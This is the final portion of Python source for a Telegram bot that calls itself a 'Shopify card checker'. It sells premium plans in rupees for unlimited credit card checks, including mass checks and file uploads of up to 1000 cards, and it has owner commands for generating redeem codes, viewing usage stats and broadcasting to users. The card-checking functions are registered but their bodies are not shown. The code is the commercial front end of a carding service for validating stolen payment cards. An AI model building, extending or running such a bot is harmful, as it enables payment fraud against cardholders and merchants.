    await status_msg.edit_text(response, parse_mode=ParseMode.MARKDOWN)

# ─── OTHER COMMANDS ────────────────────────────────────────────────

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    create_user(user.id, user.username)
    
    credits = get_credits(user.id)
    premium = check_premium(user.id)
    user_data = get_user(user.id)
    
    msg = (
        f"**👤 Account Info**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"• **User ID:** `{user.id}`\n"
        f"• **Username:** @{user.username or 'N/A'}\n"
        f"• **Credits:** `{credits}`\n"
        f"• **Premium:** `{'✅ Active' if premium else '❌ Inactive'}`\n"
    )
    
    if premium and user_data:
        expiry = user_data[4]
        msg += f"• **Expiry:** `{'Lifetime' if expiry == 'lifetime' else expiry}`\n"
        msg += f"• **Plan:** `{user_data[5] or 'Premium'}`\n"
    
    msg += (
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"**Free Limits:**\n"
        f"• `/msh`: `{FREE_MSH_LIMIT}` free checks\n"
        f"• File upload: `{FREE_FILE_CHECK_LIMIT}` free checks\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📩 Buy premium: {CONTACT_USERNAME}"
    )
    
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def profile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await credits_command(update, context)

async def plans_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        f"**💎 Premium Plans**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Premium = Unlimited CC checks + Priority\n\n"
        f"**1️⃣ Basic** — `₹250` — **1 Day**\n"
        f"**2️⃣ Monthly** — `₹500` — **30 Days**\n"
        f"**3️⃣ Yearly** — `₹1000` — **365 Days**\n"
        f"**4️⃣ Lifetime** — `₹2500` — **Forever**\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"**How to Buy:**\n"
        f"1. Contact {CONTACT_USERNAME}\n"
        f"2. Make payment\n"
        f"3. Get your Redeem Code\n"
        f"4. Use `/redeem <CODE>`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 *Free users get 131 /msh + 1000 file checks*"
    )
    
    keyboard = [[InlineKeyboardButton("📩 Contact Owner to Buy", url=f"https://t.me/theaadikoder")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    create_user(user.id, user.username)
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "❌ **Usage:** `/redeem <CODE>`\n"
            "Example: `/redeem ABCD-1234-EFGH-5678`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    code = context.args[0].strip().upper()
    success, msg = use_redeem_code(code, user.id)
    
    if success:
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(f"❌ {msg}")

# ─── OWNER COMMANDS ────────────────────────────────────────────────

async def get_red_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/get_red <credits> <duration>"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use this.")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "**Usage:** `/get_red <credits> <duration>`\n\n"
            "**Duration:** `1m` (month), `1y` (year), `30d` (days), `l` (lifetime), `0` (credits only)\n\n"
            "**Examples:**\n"
            "• `/get_red 300 1m` — 300 credits + 1 month\n"
            "• `/get_red 500 1y` — 500 credits + 1 year\n"
            "• `/get_red 1000 l` — 1000 credits + lifetime\n"
            "• `/get_red 100 30d` — 100 credits + 30 days",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        credits = int(context.args[0])
    except:
        await update.message.reply_text("❌ Credits must be a number.")
        return
    
    duration_str = context.args[1].lower()
    
    if duration_str == '0':
        duration_days, duration_label = 0, "No premium"
    elif duration_str in ('l', 'lifetime'):
        duration_days, duration_label = 99999, "Lifetime"
    elif duration_str.endswith('m'):
        m = int(duration_str[:-1])
        duration_days, duration_label = m * 30, f"{m} Month{'s' if m > 1 else ''}"
    elif duration_str.endswith('y'):
        y = int(duration_str[:-1])
        duration_days, duration_label = y * 365, f"{y} Year{'s' if y > 1 else ''}"
    elif duration_str.endswith('d'):
        d = int(duration_str[:-1])
        duration_days, duration_label = d, f"{d} Day{'s' if d > 1 else ''}"
    else:
        await update.message.reply_text("❌ Invalid duration. Use: `1m`, `1y`, `30d`, `l`, `0`", parse_mode=ParseMode.MARKDOWN)
        return
    
    code = generate_redeem_code(credits, duration_days, duration_label, OWNER_ID)
    
    await update.message.reply_text(
        f"**✅ Redeem Code Generated!**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"**Code:** `{code}`\n"
        f"**Credits:** `{credits}`\n"
        f"**Premium:** `{duration_label}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.MARKDOWN
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use this.")
        return
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users"); total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE is_premium = 1"); premium_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM check_history"); total_checks = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM redeem_codes"); total_codes = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM redeem_codes WHERE is_used = 1"); used_codes = c.fetchone()[0]
    conn.close()
    
    await update.message.reply_text(
        f"**📊 Bot Statistics**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Users: `{total_users}`\n"
        f"⭐ Premium: `{premium_users}`\n"
        f"🔍 Checks: `{total_checks}`\n"
        f"🎫 Codes: `{total_codes}` (Used: `{used_codes}`)\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.MARKDOWN
    )

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use this.")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    
    msg = ' '.join(context.args)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    
    sent = 0
    for (uid,) in users:
        try:
            await context.bot.send_message(uid, msg, parse_mode=ParseMode.MARKDOWN)
            sent += 1
        except:
            pass
    
    await update.message.reply_text(f"✅ Sent to {sent}/{len(users)} users.")

# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

def main():
    init_db()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", start_command))
    app.add_handler(CommandHandler("sh", sh_command))
    app.add_handler(CommandHandler("msh", msh_command))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("credits", credits_command))
    app.add_handler(CommandHandler("profile", profile_command))
    app.add_handler(CommandHandler("plans", plans_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("get_red", get_red_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("=" * 50)
    print("💳 SHOPIFY CARD CHECKER BOT — FINAL")
    print("=" * 50)
    print(f"🤖 Bot running...")
    print(f"👑 Owner: {OWNER_ID}")
    print(f"📩 Contact: {CONTACT_USERNAME}")
    print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"✅ /sh  — Single check (1 credit)")
    print(f"✅ /msh — Mass check ({FREE_MSH_LIMIT} free)")
    print(f"✅ File — 1000 cards free")
    print(f"✅ /chk — Reply to check remaining")
    print(f"✅ /get_red — Owner generate codes")
    print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("🚀 Bot is running...")
    print("=" * 50)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
